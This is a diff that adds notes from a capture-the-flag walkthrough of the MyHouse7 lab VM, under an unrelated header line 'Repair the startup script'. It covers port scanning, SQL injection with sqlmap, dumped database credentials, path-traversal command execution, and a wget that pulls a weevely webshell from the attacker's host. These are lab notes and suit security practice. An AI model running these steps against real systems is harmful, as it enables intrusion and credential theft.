@@ -1,0 +1,100 @@
+Repair the startup script:
+https://pwnstorm.tech/myhouse-7-1-capture-the-flag-walkthrough/:
+
+Initial Stuff
+I had to do a ton of different types of scans to find all of these
+Open Ports
+22
+25
+443
+8008
+8111
+8112
+8115
+10000
+20000
+
+Port 443
+Flag in html?
+Tryharder 999
+
+Port 8111
+Asks me to play chess, try web attacks?
+
+Port 8112
+Same page as 443
+
+Port 8115
+Timeclock software
+So many bad things:
+there are admin comments saying database is running as root
+Loginpage at http://192.168.0.45:8115/index.php/admin/login
+Def a wordpress server
+Link for RSS (remote site scripting?)
+Page with editable/runnable JS and CSS
+Timeclock page
+Found page at /timeclock/ as described in comments
+Vulnerable to sqli
+Used sqlmap to get through
+Current DB: MariaDB 10.3.10
+Current user: root@%
+Current database: timeclock
+Server hostname: e413b9ea29ac
+Current user: DBA
+Users: root@localhost, root@%
+Password hashes for root: *2E3A061302B7D1E5BD9D2F34626EB2342BA882F6
+anchordb
+Databases:
+Anchor
+Flag
+Flag ={{tryharder:766}}
+Information_schema
+Mysql
+Performance_schema
+Timeclock
+Dumped from user_info in db timeclock
+Got all the username/passwords
+Heather:heather, larryjr:larryjr, Admin:Admin, user1:user1, user2:user2
+Dirbuster
+Found web directory traversal in http://192.168.0.45:8115/system/
+Also /test/
+Found that login page is running anchor
+Also server is apache
+/themes/
+/timeclock/backup/
+Flag = {{tryharder:107}}
+Found browse_backup.php
+Cmd execution
+In all.zip → db.php
+host=172.31.20.10
+user=root
+password=anchordb
+db=timeclock
+
+Port 10000
+Default page
+
+Port 20000
+Docker heath check page
+Flag 1 in the open
+Flag 007 in html
+
+Webshell
+browse_backups.php?cmd=ls%20/../../../../bin
+See what commands are available
+Lots of them, notably wget
+Upload a weevely webshell
+Weevely generate password shell.php = make a shell
+python -m SimpleHTTPServer
+(in cmd execution) wget 192.168.149.129:8000/shellp.php -O shell.php
+(run it with directory traversal)
+weevely http://192.168.0.45:8115/timeclock/backup/shell.php password
+Boom shell
+
+Anchor Login
+Heather:heather
+Got creds from sql, nothing really interesting here.
+I am admin of webpage, can change it, nothing more.
+
+Weevely Shell
+Shell is broken...php thing isnt working...leaving off here
